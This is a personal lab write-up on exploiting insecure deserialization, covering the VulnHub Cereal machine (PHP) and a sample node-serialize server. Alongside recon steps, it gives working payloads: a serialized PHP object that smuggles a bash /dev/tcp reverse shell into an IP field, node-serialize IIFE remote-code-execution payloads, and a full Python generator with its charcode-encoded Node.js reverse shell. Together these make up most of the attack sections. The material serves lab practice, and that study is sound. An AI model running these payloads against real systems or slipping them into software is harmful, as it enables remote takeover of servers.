# Definition
Something to do.
# Laboratory 1 - PHP Deserialization
In the first laboratory, I will use the [Cereal](https://www.vulnhub.com/entry/cereal-1,703/) machine from **VulnHub** to practice this vulnerability by exploting some **PHP** serializer.
## Machine Installation and Preparation
First, we have to download the **.ova** image from [Cereal-VulnHub](https://www.vulnhub.com/entry/cereal-1,703/) source.
After that, we must to import that **.ova** image on *VMware* or another VM software like *VirtualBox*.
![[Pasted image 20230731162645.png]]
![[Pasted image 20230731163024.png]]
___
We must ensure that the *network adapter* must be connected to our **Attacker** machine using a **NAT** or **Bridged** subnet.
I have created this **NAT** subnet that uses my **Attacker** machine.
![[Pasted image 20230731162727.png]]
![[Pasted image 20230731163057.png]]
Then, deploy it.
___
## Reconnaissance
First, let's do an **ARP** scan to find out the **Cereal** machine.
```shell
sudo arp-scan -I ens33 --localnet --ignoredups
```
![[Pasted image 20230731163416.png]]
___
Then, let's create our attacking *environment* by using a custom script to automate.
![[Pasted image 20230731163608.png]]
```shell
mkdir Cereal
cd !$
mkt
cd nmap
```
___
Moving on, let's do a *Nmap* scan to scan all ports on the **Cereal** machine.
```shell
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.200.133 -oG allPorts
```
- `-p-`: All ports (65535).
- `--open`: Show open ports.
- `-sS`: Half-open scanning technique.
- `--min-rate 5000`: min rate of sent packets is 5000.
- `-vvv`: Triple verbose.
- `-n`: No DNS resolution.
- `-Pn`: No Host discovery, the IP sent is taken as valid or existing.
- `-oG`: Output is saved as Grepable in *allPorts* file.
___
Using **extractPorts** to retrieve information from *Nmap* scan.
*extractPorts is a custom script to extract information from the grepable output file.*
```bash
# to extract information from grepable nmap output
function extractPorts() {
	ports="$(cat $1	| grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')"
	ip_address="$(cat $1 | grep -oP '^Host: .* \(\)' | head -n 1 | awk '{print $2}')"
	echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
	echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
	echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
	echo $ports | tr -d '\n' | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
	cat extractPorts.tmp
	rm extractPorts.tmp
}
```
![[Pasted image 20230731164422.png]]
____
Now, we are going to use those extracted *ports* to the following *Nmap* scan. It will take a while.
```shell
sudo nmap -sCV -p21,22,80,139,445,3306,11111,22222,22223,33333,33334,44441,44444,55551,55555 192.168.200.133 -oN target
```
- `-sCV`: Applies *service* scanning and executes a few *scripts* to recognize more data about those services.
- `-p21,22,80,139,445,3306,11111,22222,22223,33333,33334,44441,44444,55551,55555`: Ports returned by before nmap scan.
- `-oN`: Output is saved as Nmapable in *targeted* file (simply, as nmap output).
![[Pasted image 20230731165944.png]]
___
You can note that there are **2** websites, the first one on the port **80** and the last one on the port **44441**.
![[Pasted image 20230731170209.png]]
___
We are going to see those *two* websites in our *web browser*.
![[Pasted image 20230731170421.png]]
___
Now, let's do a *path* discovery by using **gobuster**.
```shell
gobuster dir -u http://192.168.200.133/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
```
- `dir`: Directory brute force.
- `-u`: URL.
- `-w`: Dicctionary to be used, I use [SecLists](https://github.com/danielmiessler/SecLists).
- `-t 20`: 20 threads to do the *Brute Force*.
![[Pasted image 20230731170916.png]]
We were able to find out *two* directories **/blog/** and **/admin/**.
___
Now, by seeing both directories, we can note that the **/admin/** directory has been successfully renderized, but **/blog/** directory has not.
This happens sometimes when the *organization* uses **Virtual Hosts** to manage several websites in the same host server.
![[Pasted image 20230731171506.png]]
___
If we take a look at the *RAW* code of **/blog/** directory, we see that this directory does a request to **cereal.ctf** domain to load the whole web content.
![[Pasted image 20230731171942.png]]
___
But, our **Attacker** machine does not know that *domain*.
![[Pasted image 20230731172038.png]]
___
Therefore, we have to add that *domain* into our host addresses file at **/etc/hosts**.
```shell
sudo vim /etc/hosts
```
![[Pasted image 20230731172458.png]]
___
Then, we should use *cereal.ctf* against of the *IP* machine.
![[Pasted image 20230731172726.png]]
___
Great!, now we are going to do a **subdomain** discovery using *brute force* on the both websites on the port **80** and **44441**.
```shell
gobuster vhost -u http://cereal.ctf/ -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 20
```
- `vhost`: Specifies *subdomain* scanning.
![[Pasted image 20230731173652.png]]
Nothing.
___
Now, with **44441** website.
```shell
gobuster vhost -u http://cereal.ctf:44441/ -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 20
```
![[Pasted image 20230731173843.png]]
We were able to discover the subdomain **secure.cereal.ctf**.
___
We are going to add that *subdomain* found in **/etc/hosts**.
![[Pasted image 20230731174127.png]]
___
Then, we can see that webpage in our web browser.
![[Pasted image 20230731174302.png]]
___
## Attacking
We can note that this webpage does a *ping test* when we send a **IP** address, like **ping** command in *Linux*.
![[Pasted image 20230731175027.png]]
___
Early, we could think that the webpage does a *ping* command. So, we could do an **OS Command Injeciton** by using `;`, `&&` or `||`.
![[Pasted image 20230731175331.png]]
![[Pasted image 20230731175400.png]]
![[Pasted image 20230731175424.png]]
But, it doesn't work.
___
Good, let's use [[BurpSuite]] to know what is happening behind the **Ping!** request button.
BurpSuite did detect that the data sent is **URL encoded**.
![[Pasted image 20230731180005.png]]
___
Press **CTRL+SHIFT+u** to decode it and you will see the **OBJECT** sent.
![[Pasted image 20230731180108.png]]
So, when we send the *serialized* object, the server *deserialize* the object and executes its functions.
___
Unafortunately, we were not able to find out some to do an *exploit*.
Let's do a **Reconnaissance** more robust.
```shell
gobuster dir -u http://secure.cereal.ctf:44441/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20
```
![[Pasted image 20230731182653.png]]
___
Good!, we were able to discover the **back_en** directory. Let's see that webpage.
The **back_en** webpage, responds with status code **403**, forbidden.
![[Pasted image 20230731182918.png]]
___
But, we can **enumerate** this directory again.
```shell
gobuster dir -u http://secure.cereal.ctf:44441/back_en -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php
```
- `-x php`: Specifies the file *extension* (`.php`).
![[Pasted image 20230731183447.png]]
___
Nothing, but sometimes a few backup files contains the extension `.php.bak`, let's use that file extension.
```shell
gobuster dir -u http://secure.cereal.ctf:44441/back_en -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php.bak
```
![[Pasted image 20230731183521.png]]
___
We are going to see the content of **index.php.bak**.
![[Pasted image 20230731183632.png]]
___
Let's see its content better.
```shell
curl -s -X GET "http://secure.cereal.ctf:44441/back_en/index.php.bak" | cat -l js
```
![[Pasted image 20230731183837.png]]
We can see two *interesting* functions **validate()** and **ping()**.
___
First, the default value of `isValid` variable is **False**. Thus, never the `ping()` function will be called unless the `validate()` function verifies if the `ipAddress` variable is **VALID**.
So, we as attackers could invert the default value of `isValid` variable to *bypass* the IP validation, since, always will be **True**.
And, how do we do that?
- Further down in the code, you can note that there is a **condition** to create a *object* from **obj** sent by means of POST data.
- Now, you could think by serializing a **CUSTOM** `pingTest` *class* and send it by means of POST, then, that condition will create a *class* with our custom data.
- And finally, the server will call to the `validate()` function with our **CUSTOM** class created.
Let's do the above, we will create the *class* that contains our **CUSTOM** data.
*customClass.php*
```php
<?php

class pingTest {
	public $ipAddress = "; bash -c 'bash -i >& /dev/tcp/192.168.200.128/4646 0>1&'";
	public $isValid = True;
	public $output = "";
}

echo urlencode(serialize(new pingTest));
//echo serialize(new pingTest);
?>
```
- `$ipAddress = "; bash -c 'bash -i >& /dev/tcp/192.168.200.128/4646 0>&1'"`: To do an **Reverse Shell** to us after the *ping* command.
- `$isValid = True;`: To **Bypass** the IP validation.
![[Pasted image 20230731191345.png]]
___
Now, let's use that **string** into BurpSuite.
```shell
nc -nlvp 4646
```
![[Pasted image 20230731191453.png]]
___
# Laboratory 2 - Nodejs Deserialization
In this laboratory, I will use my *main* machine and also use the **Nodejs** server source code from [Nodejs-deserialization](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) to practice this vulnerability.
## Nodejs Server Preparation
First, we have to install some nodejs modules.
```shell
npm install express node-serialize cookie-parser
```
___
Then, we must use this script from [Nodejs-deserialization]() to deploy the web server on the port **3000**.
*node-server.js*
```js
var express = require('express');
var cookieParser = require('cookie-parser');
var escape = require('escape-html');
var serialize = require('node-serialize');
var app = express();
app.use(cookieParser())
 
app.get('/', function(req, res) {
 if (req.cookies.profile) {
   var str = new Buffer(req.cookies.profile, 'base64').toString();
   var obj = serialize.unserialize(str);
   if (obj.username) {
     res.send("Hello " + escape(obj.username));
   }
 } else {
     res.cookie('profile', "eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0=", {
       maxAge: 900000,
       httpOnly: true
     });
 }
 res.send("Hello World");
});
app.listen(3000);
```
___
Let's deploy the server see what it contains?
```shell
node nodejs-server.js
```
___
When we reload the page, we can note the message **Hello ajin**.
![[Pasted image 20230731202455.png]]
___
We are going to use [[BurpSuite]] to know what is happening behind that message.
![[Pasted image 20230731202702.png]]
___
It seems that is **URL encoded**, why don't we use *encoder/decoder* tool of *BrupSuite*?
Also, it seems that is **base64 encoded**.
And the *plain text* is a **data structure** of *ajin* user.
![[Pasted image 20230731203108.png]]
___
I suggest we can modify the *username* field and encode recursively.
![[Pasted image 20230731203335.png]]
![[Pasted image 20230731203410.png]]
___
Great!, now let's use the [serialize-script](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) to serialize data.
*serialize.js*, this script just serialize data and doesn't execute it.
```js
var y = {
 rce : function(){
 require('child_process').exec('id', function(error, stdout, stderr) { console.log(stdout) });
 },
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
```
___
```shell
node serialize.js
```
![[Pasted image 20230731204145.png]]
___
So, by adding `()` in the *serialize.js* script, we can execute the data serialized.
*serialize-IIFE.js*, this script serializes data executes it with the concept of **IIFE (Inmediately Invoked Function Expression)**.
```js
var y = {
 rce : function(){
 require('child_process').exec('id', function(error, stdout, stderr) { console.log(stdout) });
 }(),
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
```
___
```shell
node serialize-IIFE.js
```
![[Pasted image 20230731204455.png]]
___
Then, how do we make the process inverted? that is to say that the server deserialize the data and it is the one that executes it and not us.
To achieve it, we must use the [unserialize-script](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/).
*unserialize-IIFE.js*, this script deserialize from the server and uses **IIFE** to execute the `id` command from it (Note the `()` characters).
```js
var serialize = require('node-serialize');
var payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
serialize.unserialize(payload);
```
![[Pasted image 20230731205532.png]]
___
Good!, now that we were able to do a **RCE**, you could think in using a *Reverse Shell*.
To achieve it, we are going to use this [nodejsshejllpy](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py) Python script.
*nodejsshellpy.py* this script generates the string by putting the **attacker IP** and **attacker port**.
```Python
#!/usr/bin/python
# Generator for encoded NodeJS reverse shells
# Based on the NodeJS reverse shell by Evilpacket
# https://github.com/evilpacket/node-shells/blob/master/node_revshell.js
# Onelineified and suchlike by infodox (and felicity, who sat on the keyboard)
# Insecurety Research (2013) - insecurety.net
import sys

if len(sys.argv) != 3:
    print "Usage: %s <LHOST> <LPORT>" % (sys.argv[0])
    sys.exit(0)

IP_ADDR = sys.argv[1]
PORT = sys.argv[2]


def charencode(string):
    """String.CharCode"""
    encoded = ''
    for char in string:
        encoded = encoded + "," + str(ord(char))
    return encoded[1:]

print "[+] LHOST = %s" % (IP_ADDR)
print "[+] LPORT = %s" % (PORT)
NODEJS_REV_SHELL = '''
var net = require('net');
var spawn = require('child_process').spawn;
HOST="%s";
PORT="%s";
TIMEOUT="5000";
if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
function c(HOST,PORT) {
    var client = new net.Socket();
    client.connect(PORT, HOST, function() {
        var sh = spawn('/bin/sh',[]);
        client.write("Connected!\\n");
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
        sh.on('exit',function(code,signal){
          client.end("Disconnected!\\n");
        });
    });
    client.on('error', function(e) {
        setTimeout(c(HOST,PORT), TIMEOUT);
    });
}
c(HOST,PORT);
''' % (IP_ADDR, PORT)
print "[+] Encoding"
PAYLOAD = charencode(NODEJS_REV_SHELL)
print "eval(String.fromCharCode(%s))" % (PAYLOAD)
```
___
```shell
python2.7 nodejsshellpy.py 192.168.200.128 4646
```
![[Pasted image 20230731210434.png]]
___
Then, we have to add the whole string into our *new* serializer data.
```txt
{"rce":"_$$ND_FUNC$$_function(){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,57,50,46,49,54,56,46,50,48,48,46,49,50,56,34,59,10,80,79,82,84,61,34,52,54,52,54,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()"}
```
![[Pasted image 20230731210809.png]]
___
After that, we must to convert that string to **base64** and send it with *BurpSuite*.
```shell
cat data | base64 -w 0; echo
```
![[Pasted image 20230731211246.png]]
We successfully performed an *RCE*.
___